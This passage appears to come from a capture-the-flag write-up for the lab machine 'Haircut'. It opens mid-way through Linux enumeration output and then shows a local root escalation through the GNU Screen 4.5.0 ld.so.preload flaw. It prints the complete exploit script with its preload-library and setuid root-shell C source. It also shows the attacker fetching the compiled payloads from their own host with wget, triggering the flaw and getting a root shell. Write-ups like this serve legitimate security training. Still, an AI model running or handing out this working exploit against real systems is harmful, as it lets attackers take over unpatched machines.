-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 39904 May  4  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May  4  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 54256 May  4  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 40432 May  4  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49584 May  4  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 208680 Apr 29  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1


[-] SGID files:
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 62336 May  4  2017 /usr/bin/chage
-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen.old
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 22768 May  4  2017 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 358624 Mar 16  2017 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwxr-sr-x 1 root tty 27368 Dec 16  2016 /usr/bin/wall
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter


[+] Files with POSIX capabilities set:
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 7649 May 16  2017 /etc/pnm2ppa.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 112 Jan 10  2014 /etc/apg.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 350 May 15  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 144 May 15  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 7788 May 15  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 3028 Feb 15  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 191 Jan 19  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 6816 Nov 30  2016 /etc/overlayroot.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf


[-] Location and contents (if accessible) of .bash_history file(s):
/home/maria/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 1751 May 22  2017 /var/backups/passwd.bak
-rw------- 1 root shadow 744 May 16  2017 /var/backups/gshadow.bak
-rw------- 1 root root 886 May 16  2017 /var/backups/group.bak
-rw------- 1 root shadow 1123 May 22  2017 /var/backups/shadow.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Feb 15  2017 .
drwxr-xr-x 14 root root 4096 May 16  2017 ..


### SCAN COMPLETE ####################################

CHECK SETUID BIT

SEARCH FOR SCREEN EXPLOIT
root@kali:~/htb/haircut# searchsploit screen 4.5.0
---------------------------------------------------- ----------------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/)
---------------------------------------------------- ----------------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation       | exploits/linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC) | exploits/linux/local/41152.txt
---------------------------------------------------- ----------------------------------------
Shellcodes: No Result

root@kali:~/htb/haircut# searchsploit -m 41154
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154/
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/haircut/41154.sh

**IMPORTANT** MUST COMPILE ON x86_64 MACHINE NOT i686 OTHERWISE WILL GET ERROR: ERROR: ld.so: object '/tmp/libhax.so' from /etc/ld.so.preload cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.

FOLLOW INSTRUCTIONS IN SCRIPT
root@kali:~/htb/haircut# cat 41154.sh 
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell


CREATE LIBHAX C FILE AND ROOTHSHELL PER EXPLOIT INSTRUCTIONS
root@kali:~/htb/haircut# vim libhax.c
root@kali:~/htb/haircut# vim rootshell.c
root@kali:~/htb/haircut# gcc -fPIC -shared -ldl -o libhax.so libhax.c 
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
     chroot
root@kali:~/htb/haircut# gcc -o rootshell rootshell.c 
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setbuf
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setbuf
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
     setbuf
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
root@kali:~/htb/haircut# ls -l libhax.so rootshell
-rwxr-xr-x 1 root root 15068 Samh  12 16:58 libhax.so
-rwxr-xr-x 1 root root 15600 Samh  12 16:58 rootshell


UPLOAD FILES TO HAIRCUT
www-data@haircut:/tmp$ wget -q http://10.10.14.8/libhax.so
wget -q http://10.10.14.8/libhax.so
www-data@haircut:/tmp$ wget -q http://10.10.14.8/rootshell.c
wget -q http://10.10.14.8/rootshell.c

RUN STEP TO PREPARE SCREEN EXPLOIT
www-data@haircut:/tmp$ cd /etc/
cd /etc/
www-data@haircut:/etc$ umask 000
umask 000
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
<en-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"              
www-data@haircut:/etc$ cat ld.so.preload
cat ld.so.preload
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!

/tmp/libhax.sowww-data@haircut:/etc$ 

www-data@haircut:/etc$ screen-4.5.0 -ls
screen-4.5.0 -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$ ls ld.so.preload
ls ld.so.preload
ls: cannot access 'ld.so.preload': No such file or directory
www-data@haircut:/etc$ ls -l /tmp/rootshell 
ls -l /tmp/rootshell 
ls: cannot access '/tmp/rootshell': No such file or directory
www-data@haircut:/etc$ ls -l /tmp/          
ls -l /tmp/
total 24
-rw-rw-rw- 1 www-data www-data 8056 Nov 12 23:45 libhax.so
-rw-rw-rw- 1 www-data www-data  134 Nov 12 23:45 rootshell.c
drwxr-xr-x 3 root     www-data 4096 Nov 12 23:54 screens
drwx------ 3 root     root     4096 Nov 12 23:12 systemd-private-91cba5d5ac044ba29afa4c2fbca38e9b-systemd-timesyncd.service-oXqMpa
drwx------ 2 root     root     4096 Nov 12 23:12 vmware-root
www-data@haircut:/etc$ cd /tmp
cd /tmp
www-data@haircut:/tmp$ ./rootshell
./rootshell
bash: ./rootshell: No such file or directory
www-data@haircut:/tmp$ ls 
ls
libhax.so
rootshell.c
screens
systemd-private-91cba5d5ac044ba29afa4c2fbca38e9b-systemd-timesyncd.service-oXqMpa
vmware-root
www-data@haircut:/tmp$ rm rootshell.c
rm rootshell.c
www-data@haircut:/tmp$ wget -q http://10.10.14.8/rootshell 
wget -q http://10.10.14.8/rootshell
www-data@haircut:/tmp$ ls -l 
ls -l
total 32
-rw-rw-rw- 1 www-data www-data 8056 Nov 12 23:45 libhax.so
-rw-rw-rw- 1 www-data www-data 8488 Nov 12 23:45 rootshell
drwxr-xr-x 3 root     www-data 4096 Nov 12 23:54 screens
drwx------ 3 root     root     4096 Nov 12 23:12 systemd-private-91cba5d5ac044ba29afa4c2fbca38e9b-systemd-timesyncd.service-oXqMpa
drwx------ 2 root     root     4096 Nov 12 23:12 vmware-root
www-data@haircut:/tmp$ cd /etc
cd /etc
www-data@haircut:/etc$ umask 000
umask 000
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
<en-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"              
www-data@haircut:/etc$ cat ld.so.preload
cat ld.so.preload
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!

/tmp/libhax.sowww-data@haircut:/etc$ screen-4.5.0 -ls
screen-4.5.0 -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$ screen-4.5.0 -ls
screen-4.5.0 -ls
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$ ls ld.so.preload
ls ld.so.preload
ls: cannot access 'ld.so.preload': No such file or directory
www-data@haircut:/etc$ ls -l /tmp/rootshell 
ls -l /tmp/rootshell 
-rwsr-xr-x 1 root root 8488 Nov 12 23:45 /tmp/rootshell

GET ROOTSHELL
www-data@haircut:/etc$ /tmp/rootshell 
/tmp/rootshell 
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

GET ROOT FLAG
# cat /root/root.txt
cat /root/root.txt
############################

